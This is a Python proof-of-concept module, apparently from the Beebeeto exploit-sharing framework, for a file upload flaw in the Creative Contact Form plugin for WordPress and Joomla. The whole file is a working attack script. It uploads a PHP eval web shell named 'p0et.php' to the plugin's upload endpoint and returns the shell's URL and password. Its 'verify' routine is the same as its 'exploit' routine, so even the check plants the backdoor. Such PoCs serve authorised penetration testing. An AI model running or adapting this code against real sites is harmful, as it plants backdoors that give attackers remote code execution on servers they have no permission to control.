#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        'poc': {
            'id': 'poc-2014-0121',
            'name': 'Wordpress and Joomla Creative Contact Form 0.9.7 文件上传漏洞 Exploits',
            'author': 'p0et',
            'create_date': '2014-10-28',
        },
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['0.9.7'],
            'type': 'File Upload',
            'tag': ['Wordpress漏洞', 'Joomla漏洞', 'Creative Contact Form', 'php'],
            'desc': 'Wordpress and Joomla Creative Contact Form <=0.9.7 file upload.',
            'references': ['http://www.exploit-db.com/exploits/35057/',
            ],
        },
    }
    def _init_user_parser(self):
        self.user_parser.add_option('-c', '--cms', action="store",
            help="Insert CMS Type: wordpress|joomla",)

    @staticmethod
    def create_body_sh3ll_upl04d():
       LIMIT = '----------lImIt_of_THE_fIle_eW_$'
       CRLF = '\r\n'
       L = []
       L.append('--' + LIMIT)
       L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', 'p0et.php'))
       L.append('Content-Type: %s' % 'application/octet-stream')
       L.append('')
       L.append('<?php eval $_POST(1); ?>')
       L.append('--' + LIMIT + '--')
       L.append('')
       body = CRLF.join(L)
       return body

    @classmethod
    def verify(cls, args):

        if args['options']['cms'] == "wordpress":
            url_sexy_upload = args['options']['target']+'/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php'
            backdoor_location = args['options']['target']+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'

        elif args['options']['cms'] == "joomla":
            url_sexy_upload = args['options']['target']+'/components/com_creativecontactform/fileupload/index.php'
            backdoor_location = args['options']['target']+'/components/com_creativecontactform/fileupload/files/'

        content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'
        bodyupload = cls.create_body_sh3ll_upl04d()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                   'content-type': content_type,
                   'content-length': str(len(bodyupload)) }

        req = urllib2.Request(url_sexy_upload, bodyupload, headers)
        response = urllib2.urlopen(req)

        if "error" in response.read():
            if args['options']['verbose']:
                print("[X] Upload Failed :(")
        else:
            args['success'] = True
            print("[!] Shell Uploaded")
            #print("[!] "+backdoor_location+'p0et.php')
            args['poc_ret']['vul_url'] = backdoor_location
            args['poc_ret']['Webshell'] = backdoor_location+'p0et.php'
            args['poc_ret']['Webshell_PWD'] = '1'
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())